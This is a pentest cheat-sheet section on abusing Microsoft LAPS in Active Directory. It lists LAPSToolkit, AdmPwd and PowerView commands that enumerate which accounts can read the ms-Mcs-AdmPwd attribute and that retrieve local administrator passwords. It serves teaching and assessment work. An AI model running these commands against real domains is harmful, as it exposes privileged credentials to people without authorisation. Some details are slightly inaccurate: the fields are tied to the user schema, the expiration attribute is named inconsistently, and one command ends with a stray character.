## LAPS Abuse

LAPS provides a solution to local administrator password re-use. If LAPS is in use, administrators passwords are set and randomly changed on a user-defined schedule. The Active Directory schema for the user has two new fields added: `ms-Mcs-AdmPwd` and `ms-Mcs-AdmPwdExpirationDate`. When the machine updates its GPO, it checks the `AdmPwdExpirationTime`. If it's in the past, the user's password gets updated.

It is possible to read this field if you have either a DACL on the `AdmPwd` field or if you are part of an OU that has the rights to read `AdmPwd` applied to it. If LAPS is in use, there will generally be a LAPS folder in `C:\Program Files`.

### Using LAPSToolkit

The LAPSToolkit is available at: 

https://github.com/leoloobeek/LAPSToolkit

Load it into memory or on disk and run it to identify computers/passwords using LAPS. It can also find groups that can read the `ms-Mcs-AdmPwd` attribute and find users with `AllExtendedRights` which also allows the user to view the LAPS password also.

```powershell
Get-LAPSComputers
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
```

### Attacking LAPS Manually

Naturally, being able to read the local administrator password presents attacking opportunities. You can check if the LAPS cmdlet is installed with the following Powershell command:

```powershell
Get-Command *AdmPwd*
```

If it is, you can start trying to enumerate it.

```powershell
# Ascertain which users/groups have ExtendedRights to view passwords on the Workstations OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# View the LAPS password on the dc04 machine
Get-AdmPwdPassword -ComputerName dc04
```

We can also use Powerview to enumerate LAPS rights - The SID outputs will have to be converted though.

```powershell
# Find SIDs where the user has LAPS rights over the workstations in the Workstations OU
Get-DomainObjectAcl -SearchBase "LDAP://OU=Workstations,DC=MATRIX,DC=LOCAL" -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -like "*ReadProperty*" } | select ObjectDN, SecurityIdentifier

# Convert the SID
ConvertFrom-SID S-1-5-21-3619591028-1129495842-3952564-1001>
```


